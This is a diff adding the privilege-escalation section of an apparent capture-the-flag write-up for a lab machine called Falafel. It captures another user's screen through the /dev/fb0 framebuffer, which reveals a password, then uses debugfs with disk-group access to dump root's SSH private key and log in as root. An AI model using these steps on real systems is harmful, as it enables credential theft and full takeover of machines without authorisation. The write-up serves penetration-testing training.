@@ -178,11 +178,13 @@ We url-encode it, execute `nc -lvp 443` to start a netcat listener and execute i
 
 # Privilege Escalation
 
+<!-- ffmpeg -vcodec rawvideo -f rawvideo -pix_fmt rgb565 -s 1176x885 -i fb0.raw -f image2 -vcodec mjpeg -frames:v 1 out-buffer.jpg -->
+
 {% highlight none linenos %}
 $ @@ls ../..@@
 assets
 authorized.php
-connection.php
+@@@connection.php@@@
 css
 cyberlaw.txt
 footer.php
@@ -229,7 +231,211 @@ Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)
 
 
 Last login: Mon Feb  5 23:35:10 2018 from 10.10.14.2
-$ @@id@@
-uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
+$ @@groups@@
+moshe adm mail news voice floppy audio @@@video@@@ games
+{% endhighlight %}
+
+If we execute `w`, we see that the `yossi` user is currently physically active on the target host. We
+
+{% highlight none linenos %}
+$ @@w@@
+ 19:56:03 up 13 min,  2 users,  load average: 0.07, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+@@@yossi@@@    tty1                      19:42   13:38   0.07s  0.06s -bash
+moshe    pts/0    10.10.16.3       19:56    2.00s  0.00s  0.00s w
+$ @@ls -l /dev/fb*@@
+crw-rw---- 1 root @@@video@@@ 29, 0 May  1 19:42 @@@/dev/fb0@@@
+$ @@cat /dev/fb0 > /tmp/screenshot.raw@@
+$ @@cat /sys/class/graphics/fb0/virtual_size@@
+@@@1176,885@@@
 $
+{% endhighlight %}
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@scp moshe@10.10.10.73:/tmp/screenshot.raw ./screenshot.raw@@
+moshe@10.10.10.73's password: 
+@@@screenshot.raw                                                                    100%@@@ 4065KB   2.4MB/s   00:01    
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ 
+{% endhighlight %}
+
+{% highlight none linenos %}
+{% endhighlight %}
+
+TODO: Background of frame buffer
+It is a [character device] which makes it easy for software to interact with the video hardware.
+
+We can use ffmpeg to convert the captured image from the frame buffer. We do this by executing `ffmpeg -pix_fmt [pixelFormat] -s 1176x885 -f rawvideo -i fb0.raw -f singlejpeg screenshot.jpg` where [pixelFormat] is the pixel format we want. TODO: Explain flags
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@ffmpeg -pix_fmts@@                                                                       
+[...]
+Pixel formats:
+I.... = Supported Input  format for conversion
+.O... = Supported Output format for conversion
+..H.. = Hardware accelerated format
+...P. = Paletted format
+....B = Bitstream format
+FLAGS NAME            NB_COMPONENTS BITS_PER_PIXEL
+-----
+IO... yuv420p                3            12
+IO... yuyv422                3            16
+IO... rgb24                  3            24
+IO... bgr24                  3            24
+IO... yuv422p                3            16
+IO... yuv444p                3            24
+IO... yuv410p                3             9
+IO... yuv411p                3            12
+IO... gray                   1             8
+IO..B monow                  1             1
+IO..B monob                  1             1
+I..P. pal8                   1             8
+IO... yuvj420p               3            12
+IO... yuvj422p               3            16
+IO... yuvj444p               3            24
+IO... uyvy422                3            16
+..... uyyvyy411              3            12
+IO... bgr8                   3             8
+.O..B bgr4                   3             4
+IO... bgr4_byte              3             4
+IO... rgb8                   3             8
+.O..B rgb4                   3             4
+IO... rgb4_byte              3             4
+IO... nv12                   3            12
+IO... nv21                   3            12
+IO... argb                   4            32
+IO... rgba                   4            32
+[...]
+{% endhighlight %}
+
+This results in a set of images which are shown in the video below. 
+
+<video width="100%" controls="controls">
+  <source src="/assets/{{ imgDir }}/pixelFormats.mp4" type="video/mp4">
+</video>
+
+
+We use the -f flag twice. Once for the input file and once for the output file
+
+It is also possible to this with gimp or with custom code.
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screenshot.raw -f singlejpeg screenshot.jpg@@
+ffmpeg version 4.4.1-3+b2 Copyright (c) 2000-2021 the FFmpeg developers
+  built with gcc 11 (Debian 11.2.0-18)
+  configuration: --prefix=/usr --extra-version=3+b2 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-shared
+  libavutil      56. 70.100 / 56. 70.100
+  libavcodec     58.134.100 / 58.134.100
+  libavformat    58. 76.100 / 58. 76.100
+  libavdevice    58. 13.100 / 58. 13.100
+  libavfilter     7.110.100 /  7.110.100
+  libswscale      5.  9.100 /  5.  9.100
+  libswresample   3.  9.100 /  3.  9.100
+  libpostproc    55.  9.100 / 55.  9.100
+[rawvideo @ 0x56212015f700] Estimating duration from bitrate, this may be inaccurate
+Input #0, rawvideo, from 'screenshot.raw':
+  Duration: 00:00:00.04, start: 0.000000, bitrate: 832608 kb/s
+  Stream #0:0: Video: rawvideo ([0]RGB / 0x42475200), 0rgb, 1176x885, 832608 kb/s, 25 tbr, 25 tbn, 25 tbc
+Stream mapping:
+  @@@Stream #0@@@:0 -> #0:0 (@@@rawvideo@@@ (native) -> @@@mjpeg@@@ (native))
+Press [q] to stop, [?] for help
+[swscaler @ 0x562120178740] deprecated pixel format used, make sure you did set range correctly
+@@@Output #0, singlejpeg, to 'screenshot.jpg'@@@:
+  Metadata:
+    encoder         : Lavf58.76.100
+  Stream #0:0: Video: mjpeg, yuvj444p(pc, progressive), 1176x885, q=2-31, 200 kb/s, 25 fps, 25 tbn
+    Metadata:
+      encoder         : Lavc58.134.100 mjpeg
+    Side data:
+      cpb: bitrate max/min/avg: 0/0/200000 buffer size: 0 vbv_delay: N/A
+frame=    1 fps=0.0 q=5.7 Lsize=      46kB time=00:00:00.04 bitrate=9339.0kbits/s speed= 1.7x    
+video:46kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.000000%
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@xdg-open screenshot.jpg@@
+{% endhighlight %}
+
+Internally, we see that the tool converts the frame buffer data to a mjpeg format. Then, it uses this data to create a single jpg file.
+
+![screenshot](/assets/{{ imgDir }}/screenshot.png)
+
+We see that the yossi user attempted to change password to `MoshePlzStopHackingMe!`
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@ssh yossi@10.10.10.73@@
+yossi@10.10.10.73's password:
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sun May  1 19:42:33 2022
+yossi@falafel:~$ @@groups@@
+yossi adm @@@disk@@@ cdrom dip plugdev lpadmin sambashare
+yossi@falafel:~$
+{% endhighlight %}
+
+{% highlight none linenos %}
+yossi@falafel:~$ @@df@@
+Filesystem     1K-blocks    Used Available Use% Mounted on
+udev              487824       0    487824   0% /dev
+tmpfs             101604    4656     96948   5% /run
+@@@/dev/sda1@@@        7092728 2354532   4354864  36% /
+tmpfs             508008       0    508008   0% /dev/shm
+tmpfs               5120       0      5120   0% /run/lock
+tmpfs             508008       0    508008   0% /sys/fs/cgroup
+tmpfs             101604       0    101604   0% /run/user/1000
+yossi@falafel:~$ @@debugfs /dev/sda1@@
+debugfs 1.42.13 (17-May-2015)
+debugfs:  @@ls -l /root/.ssh@@
+ 402797   40755 (2)      0      0    4096 15-Jan-2018 02:12 .
+ 262241   40750 (2)      0      0    4096  5-Feb-2018 17:04 ..
+ 402812  100600 (1)      0      0    1679 28-Nov-2017 23:01 @@@id_rsa@@@
+ 402822  100644 (1)      0      0     394 28-Nov-2017 23:01 id_rsa.pub
+ 402824  100600 (1)      0      0     394 28-Nov-2017 23:17 authorized_keys
+debugfs:  @@dump /root/.ssh/id_rsa /tmp/id_rsa@@
+debugfs:  @@quit@@
+yossi@falafel:~$
+{% endhighlight %}
+
+{% highlight none linenos %}
+yossi@falafel:~$ @@cd /tmp@@
+yossi@falafel:/tmp$ @@ls -l@@
+total 4084
+@@@-rw-------@@@ 1 @@@yossi@@@ @@@yossi@@@    1679 May  1 21:07 @@@id_rsa@@@
+-rw-rw-r-- 1 moshe moshe 4163040 May  1 19:43 screenshot.raw
+drwx------ 3 root  root     4096 May  1 19:42 systemd-private-d40e650d496c4e869d429f14c8dec8aa-systemd-timesyncd.service-vyIRsF                                                                                                         
+drwx------ 2 root  root     4096 May  1 19:42 vmware-root
+drwxrwxr-x 2 yossi yossi    4096 May  1 20:34 x
+yossi@falafel:/tmp$ @@chmod 600 id_rsa@@
+yossi@falafel:/tmp$ @@ssh -i ./id_rsa root@localhost@@
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:XPYifpo9zwt53hU1RwUWqFvOB3TlCtyA1PfM9frNWSw.
+Are you sure you want to continue connecting (yes/no)? @@yes@@
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
+@@@root@@@@falafel:~# 
+{% endhighlight %}
+
+{% highlight none linenos %}
 {% endhighlight %}
